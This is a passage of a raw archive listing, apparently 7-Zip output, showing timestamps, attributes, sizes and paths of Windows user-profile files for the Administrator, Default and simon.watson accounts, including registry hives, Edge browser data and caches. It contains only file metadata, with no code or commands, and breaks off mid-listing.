D.... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs 2025-02-16 11:05:58 DR... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility 2021-05-08 08:20:26 D.... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories 2021-05-08 08:20:26 D.... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance 2021-05-08 08:20:26 DR... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools 2022-03-03 03:58:19 D.... simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell 2021-05-08 08:34:03 D.HS. 82 82 All Users 2021-05-08 08:34:03 D.HS. 84 84 Default User 2025-02-16 10:48:46 D.HS. 172 172 Administrator/Application Data 2025-02-16 10:48:46 D.HS. 284 284 Administrator/Cookies 2025-02-16 10:48:46 D.HS. 164 164 Administrator/Local Settings 2025-02-16 10:48:46 D.HS. 164 164 Administrator/AppData/Local/Application Data 2025-02-16 10:48:46 D.HS. 148 148 Administrator/My Documents 2025-02-16 10:48:46 D.HS. 316 316 Administrator/NetHood 2025-02-16 10:48:46 D.HS. 316 316 Administrator/PrintHood 2025-02-16 10:48:46 D.HS. 272 272 Administrator/Recent 2025-02-16 10:48:46 D.HS. 272 272 Administrator/SendTo 2025-02-16 10:48:46 D.HS. 288 288 Administrator/Start Menu 2025-02-16 10:48:46 D.HS. 284 284 Administrator/Templates 2025-02-16 10:48:46 D.HS. 268 268 Administrator/AppData/Local/History 2025-02-16 10:48:46 D.HS. 276 276 Administrator/AppData/Local/Temporary Internet Files 2025-02-16 10:48:46 D.HS. 276 276 Administrator/AppData/Local/Microsoft/Windows/Temporary Internet Files 2025-02-16 11:10:30 D.HS. 288 288 Administrator/AppData/Local/Microsoft/Windows/INetCache/Content.IE5 2025-02-16 10:48:46 D.HS. 132 132 Administrator/Documents/My Music 2025-02-16 10:48:46 D.HS. 144 144 Administrator/Documents/My Pictures 2025-02-16 10:48:46 D.HS. 136 136 Administrator/Documents/My Videos 2025-02-16 19:48:13 D.HS. 148 148 Default/Application Data 2025-02-16 19:48:13 D.HS. 260 260 Default/Cookies 2025-02-16 19:48:13 D.HS. 140 140 Default/Local Settings 2025-02-16 19:48:13 D.HS. 140 140 Default/AppData/Local/Application Data 2025-02-16 19:48:13 D.HS. 124 124 Default/My Documents 2025-02-16 19:48:13 D.HS. 292 292 Default/NetHood 2025-02-16 19:48:13 D.HS. 292 292 Default/PrintHood 2025-02-16 19:48:13 D.HS. 248 248 Default/Recent 2025-02-16 19:48:13 D.HS. 248 248 Default/SendTo 2025-02-16 19:48:13 D.HS. 264 264 Default/Start Menu 2025-02-16 19:48:13 D.HS. 260 260 Default/Templates 2025-02-16 19:48:13 D.HS. 244 244 Default/AppData/Local/History 2025-02-16 19:48:13 D.HS. 252 252 Default/AppData/Local/Temporary Internet Files 2025-02-16 19:48:13 D.HS. 252 252 Default/AppData/Local/Microsoft/Windows/Temporary Internet Files 2025-02-16 19:48:13 D.HS. 108 108 Default/Documents/My Music 2025-02-16 19:48:13 D.HS. 120 120 Default/Documents/My Pictures 2025-02-16 19:48:13 D.HS. 112 112 Default/Documents/My Videos 2025-02-16 19:48:13 D.HS. 104 104 Public/Documents/My Music 2025-02-16 19:48:13 D.HS. 116 116 Public/Documents/My Pictures 2025-02-16 19:48:13 D.HS. 108 108 Public/Documents/My Videos 2025-02-16 11:15:52 D.HS. 168 168 simon.watson/Application Data 2025-02-16 11:15:52 D.HS. 280 280 simon.watson/Cookies 2025-02-16 11:15:52 D.HS. 160 160 simon.watson/Local Settings 2025-02-16 11:15:52 D.HS. 160 160 simon.watson/AppData/Local/Application Data 2025-02-16 11:15:52 D.HS. 144 144 simon.watson/My Documents 2025-02-16 11:15:52 D.HS. 312 312 simon.watson/NetHood 2025-02-16 11:15:52 D.HS. 312 312 simon.watson/PrintHood 2025-02-16 11:15:52 D.HS. 268 268 simon.watson/Recent 2025-02-16 11:15:52 D.HS. 268 268 simon.watson/SendTo 2025-02-16 11:15:52 D.HS. 284 284 simon.watson/Start Menu 2025-02-16 11:15:52 D.HS. 280 280 simon.watson/Templates 2025-02-16 11:15:52 D.HS. 264 264 simon.watson/AppData/Local/History 2025-02-16 11:15:52 D.HS. 272 272 simon.watson/AppData/Local/Temporary Internet Files 2025-02-16 11:15:52 D.HS. 272 272 simon.watson/AppData/Local/Microsoft/Windows/Temporary Internet Files 2025-02-16 11:15:52 D.HS. 128 128 simon.watson/Documents/My Music 2025-02-16 11:15:52 D.HS. 140 140 simon.watson/Documents/My Pictures 2025-02-16 11:15:52 D.HS. 132 132 simon.watson/Documents/My Videos 2025-02-16 10:48:46 ..HSA 0 0 Administrator/ntuser.dat.LOG1 2025-02-16 11:04:12 ....A 0 0 Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db-wal 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/metadata 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Favicons-journal 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/History-journal 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Login Data-journal 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Media History-journal 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Web Data-journal 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/000003.log 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/LOCK 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/LOCK 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/LOCK 2025-02-16 11:17:31 ....A 0 0 Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/.inUse 2025-02-16 10:48:47 ..HSA 0 0 Administrator/AppData/Local/Microsoft/Windows/WebCacheLock.dat 2025-02-16 10:48:48 ..HSA 0 0 Administrator/AppData/Local/Microsoft/Windows/History/History.IE5/container.dat 2025-02-16 11:18:05 ..HSA 0 0 Administrator/AppData/Local/Microsoft/Windows/History/History.IE5/MSHist012025021620250217/container.dat 2025-02-16 10:48:48 ..HSA 0 0 Administrator/AppData/Local/Microsoft/Windows/INetCache/IE/container.dat 2025-02-16 10:59:25 ..HSA 0 0 Administrator/AppData/Local/Microsoft/Windows/INetCookies/container.dat 2025-02-16 10:52:04 ..HSA 0 0 Administrator/AppData/Local/Microsoft/Windows/INetCookies/ESE/container.dat 2025-02-16 11:17:04 ..H.A 0 0 Administrator/AppData/Local/Microsoft/Windows/Notifications/WPNPRMRY.tmp 2025-02-16 11:11:03 ....A 0 0 Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:03 ....A 0 0 Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:03 ....A 0 0 Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:48 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:53 ..HSA 0 0 Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/settings.dat.LOG2 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/Settings/roaming.lock 2025-02-16 10:48:48 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/Settings/roaming.lock 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:02 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:01 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:01 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:48 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:01 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/Settings/roaming.lock 2025-02-16 10:48:48 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:48 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:01 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:01 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:52:22 ..HSA 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCache/container.dat 2025-02-16 10:52:22 ..HSA 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCookies/ESE/container.dat 2025-02-16 10:52:22 ..HSA 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/container.dat 2025-02-16 10:48:50 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:52 ..HSA 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/settings.dat.LOG2 2025-02-16 11:11:01 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:52 ..HSA 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/settings.dat.LOG2 2025-02-16 11:11:00 ....A 0 0 Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:00 ....A 0 0 Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:00 ....A 0 0 Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 11:11:00 ....A 0 0 Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/Settings/roaming.lock 2025-02-16 10:49:06 ...SA 0 0 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/57C8EDB95DF3F0AD4EE2DC2B8CFD4157 2025-02-16 10:48:49 ...SA 0 0 Administrator/AppData/Roaming/Microsoft/SystemCertificates/My/AppContainerUserCertRead 2025-02-16 10:48:49 ....A 0 0 Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Documents.mydocs 2021-05-08 08:06:51 ..HSA 0 0 Default/NTUSER.DAT.LOG1 2025-02-16 11:15:52 ..HSA 0 0 simon.watson/ntuser.dat.LOG2 2021-05-08 08:18:31 ..HSA 174 174 desktop.ini 2025-02-16 10:48:46 ..HSA 201728 54000 Administrator/ntuser.dat.LOG2 2025-02-16 10:58:11 ..HSA 65536 1372 Administrator/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf 2025-02-16 11:16:07 ..H.A 786432 159999 Administrator/NTUSER.DAT 2025-02-16 10:48:46 ..HSA 524288 4309 Administrator/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 10:48:46 ..HSA 524288 4268 Administrator/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 10:52:22 ....A 524288 4268 Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edbres00001.jrs 2025-02-16 10:52:22 ....A 524288 4268 Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edbres00002.jrs 2025-02-16 10:52:22 ....A 524288 4268 Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edbtmp.log 2025-02-16 10:48:46 ..HSA 524288 4268 Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat{eebdb8bc-ec9e-11ef-9382-000c2945598d}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 10:48:48 ....A 524288 4268 Administrator/AppData/Local/Microsoft/Windows/WebCache/V01res00001.jrs 2025-02-16 10:48:48 ....A 524288 4268 Administrator/AppData/Local/Microsoft/Windows/WebCache/V01res00002.jrs 2025-02-16 10:48:48 ....A 524288 4268 Administrator/AppData/Local/Microsoft/Windows/WebCache/V01tmp.log 2025-02-16 10:52:22 ....A 524288 4268 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edbres00001.jrs 2025-02-16 10:52:22 ....A 524288 4268 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edbres00002.jrs 2025-02-16 10:52:22 ....A 524288 4268 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edbtmp.log 2025-02-16 19:48:13 ..HSA 524288 4268 Default/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 11:15:52 ..HSA 524288 4268 simon.watson/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 11:15:52 ..HSA 524288 4268 simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat{29917715-ec57-11ef-9385-000c2945598d}.TMContainer00000000000000000002.regtrans-ms 2025-02-16 10:48:46 ..HS. 20 20 Administrator/ntuser.ini 2025-02-16 11:15:52 ..HS. 20 20 simon.watson/ntuser.ini 2025-02-16 10:48:48 ..HSA 298 298 Administrator/3D Objects/desktop.ini 2025-02-16 11:14:06 ..H.A 7404 1199 Administrator/AppData/Local/IconCache.db 2025-02-16 11:17:05 ....A 4347 1397 Administrator/AppData/Local/ConnectedDevicesPlatform/CDPGlobalSettings.cdp 2025-02-16 10:48:47 ....A 654 633 Administrator/AppData/Local/ConnectedDevicesPlatform/Connected Devices Platform certificates.sst 2025-02-16 11:17:04 ....A 54 54 Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator.cdpresource 2025-02-16 11:17:06 ....A 986 591 Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator.cdp 2025-02-16 11:17:06 ....A 32768 279 Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db-shm 2025-02-16 11:04:12 ....A 1048576 12399 Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/ActivitiesCache.db 2025-02-16 10:48:48 ..HSA 11136 11136 Administrator/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D 2025-02-16 10:48:49 ....A 11 11 Administrator/AppData/Local/Microsoft/Edge/User Data/Last Version 2025-02-16 10:48:49 ....A 1048576 8876 Administrator/AppData/Local/Microsoft/Edge/User Data/CrashpadMetrics-active.pma 2025-02-16 10:48:49 ....A 2791 1597 Administrator/AppData/Local/Microsoft/Edge/User Data/Local State 2025-02-16 10:48:49 ....A 152 152 Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/settings.dat 2025-02-16 10:48:49 ....A 20 20 Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/throttle_store.dat 2025-02-16 10:48:49 ....A 71757 47593 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Edge Profile.ico 2025-02-16 10:48:49 ....A 20480 815 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Favicons 2025-02-16 10:48:49 ....A 118784 2610 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/History 2025-02-16 10:48:49 ....A 40960 1703 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Login Data 2025-02-16 10:48:49 ....A 139264 3311 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Media History 2025-02-16 10:48:49 ....A 2904 1583 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Preferences 2025-02-16 10:48:49 ....A 182 182 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/README 2025-02-16 10:48:49 ....A 26282 9182 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Secure Preferences 2025-02-16 10:48:49 ....A 4194304 44869 Administrator/AppData/Local/Microsoft/Edge/User Data/BrowserMetrics/BrowserMetrics-67B1C291-7C8.pma 2025-02-16 10:48:49 ....A 24 24 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/js/index 2025-02-16 10:48:49 ....A 24 24 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/wasm/index 2025-02-16 10:48:49 ....A 16 16 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/CURRENT 2025-02-16 10:48:49 ....A 16 16 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/CURRENT 2025-02-16 10:48:49 ....A 16 16 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/CURRENT 2025-02-16 10:48:49 ....A 92160 3537 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Web Data 2025-02-16 10:48:49 ....A 153 153 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/LOG 2025-02-16 10:48:49 ....A 41 41 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/MANIFEST-000001 2025-02-16 10:48:49 ....A 41 41 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/MANIFEST-000001 2025-02-16 10:48:49 ....A 41 41 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/MANIFEST-000001 2025-02-16 10:48:49 ....A 40 40 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/000003.log 2025-02-16 10:48:49 ....A 161 161 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database/LOG 2025-02-16 10:48:49 ....A 84 84 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/000003.log 2025-02-16 10:48:49 ....A 149 149 Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB/LOG 2025-02-16 10:48:49 ....A 8192 267 Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_0 2025-02-16 10:48:49 ....A 8192 267 Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_2 2025-02-16 10:49:00 ....A 270336 2421 Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_1 2025-02-16 10:48:49 ....A 8192 269 Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/data_3 2025-02-16 10:48:49 ....A 184 184 Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local/cache 2025-02-16 10:48:49 ....A 184 184 Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local/download_cache 2025-02-16 10:48:49 ....A 262512 2413 Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache/index 2025-02-16 10:48:49 ....A 72 72 Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local/warnStateCache 2025-02-16 10:48:48 ....A 6503 1610 Administrator/AppData/Local/Microsoft/Internet Explorer/brndlog.bak 2025-02-16 11:10:30 ....A 4305 1212 Administrator/AppData/Local/Microsoft/Internet Explorer/brndlog.txt 2025-02-16 11:10:35 ....A 710 355 Administrator/AppData/Local/Microsoft/Internet Explorer/ie4uinit-ClearIconCache.log 2025-02-16 11:10:30 ....A 2724 616 Administrator/AppData/Local/Microsoft/Internet Explorer/ie4uinit-UserConfig.log 2025-02-16 11:17:32 ....A 8192 371 Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edb.chk 2025-02-16 11:17:31 ....A 524288 14237 Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage/edb.log 2025-02-16 11:10:30 ....A 3050 1045 Administrator/AppData/Local/Microsoft/Internet Explorer/IECompatData/iecompatdata.xml 2025-02-16 10:48:48 ....A 1044 587 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/01_Music_auto_rated_at_5_stars.wpl 2025-02-16 10:48:48 ....A 1279 599 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/02_Music_added_in_the_last_month.wpl 2025-02-16 10:48:48 ....A 1267 593 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/03_Music_rated_at_4_or_5_stars.wpl 2025-02-16 10:48:48 ....A 1284 603 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/04_Music_played_in_the_last_month.wpl 2025-02-16 10:48:48 ....A 797 560 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/05_Pictures_taken_in_the_last_month.wpl 2025-02-16 10:48:48 ....A 785 552 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/06_Pictures_rated_4_or_5_stars.wpl 2025-02-16 10:48:48 ....A 1040 592 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/07_TV_recorded_in_the_last_week.wpl 2025-02-16 10:48:48 ....A 1020 584 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/08_Video_rated_at_4_or_5_stars.wpl 2025-02-16 10:48:48 ....A 1025 575 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/09_Music_played_the_most.wpl 2025-02-16 10:48:48 ....A 1063 570 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/10_All_Music.wpl 2025-02-16 10:48:48 ....A 1079 603 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/12_All_Video.wpl 2025-02-16 10:48:48 ....A 585 499 Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052/11_All_Pictures.wpl 2025-02-16 11:16:07 ....A 1022 463 Administrator/AppData/Local/Microsoft/PenWorkspace/DiscoverCacheData.dat 2025-02-16 10:48:47 ....A 436 436 Administrator/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28/Policy.vpol 2025-02-16 10:48:46 ..HSA 439296 93279 Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1 2025-02-16 10:48:46 ..HSA 323584 67891 Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2 2025-02-16 10:58:11 ..HSA 65536 1442 Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat{eebdb8bc-ec9e-11ef-9382-000c2945598d}.TM.blf 2025-02-16 11:16:07 ..H.A 1572864 306904 Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat 2025-02-16 10:48:46 ..HSA 524288 4309 Administrator/AppData/Local/Microsoft/Windows/UsrClass.dat{eebdb8bc-ec9e-11ef-9382-000c2945598d}.TMContainer00000000000000000001.regtrans-ms 2025-02-16 10:48:48 ..HS. 174 174 Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini 2025-02-16 10:48:53 ..HS. 174 174 Administrator/AppData/Local/Microsoft/Windows/Burn/Burn/desktop.ini 2025-02-16 11:16:06 ....A 16384 1003 Administrator/AppData/Local/Microsoft/Windows/Caches/cversions.1.db 2025-02-16 10:48:48 ....A 16384 1028 Administrator/AppData/Local/Microsoft/Windows/Caches/cversions.3.db 2025-02-16 11:10:36 ....A 424337 125879 Administrator/AppData/Local/Microsoft/Windows/1033/StructuredQuerySchema.bin 2025-02-16 11:10:41 ....A 71840 14632 Administrator/AppData/Local/Microsoft/Windows/Caches/{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000006.db 2025-02-16 11:16:06 ....A 204112 2424 Administrator/AppData/Local/Microsoft/Windows/Caches/{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000001.db 2025-02-16 11:10:46 ....A 424376 125907 Administrator/AppData/Local/Microsoft/Windows/Caches/{0BDE7B0F-B905-4D30-88C9-B63C603DA134}.3.ver0x0000000000000001.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_1280.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_1280.db 2025-02-16 10:48:53 ....A 368640 58961 Administrator/AppData/Local/Microsoft/Windows/Explorer/ExplorerStartupLog.etl 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_1920.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_1920.db 2025-02-16 11:10:31 ....A 1048576 50749 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_16.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_2560.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_2560.db 2025-02-16 11:10:47 ....A 1048576 27041 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_256.db 2025-02-16 10:59:25 ....A 1048576 124819 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_32.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_768.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_768.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_96.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_96.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_custom_stream.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_custom_stream.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_exif.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_exif.db 2025-02-16 11:15:11 ....A 14688 2158 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_idx.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_sr.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_sr.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_wide.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_wide.db 2025-02-16 10:59:25 ....A 1048576 118939 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_48.db 2025-02-16 10:59:25 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/iconcache_wide_alternate.db 2025-02-16 10:48:50 ....A 24 24 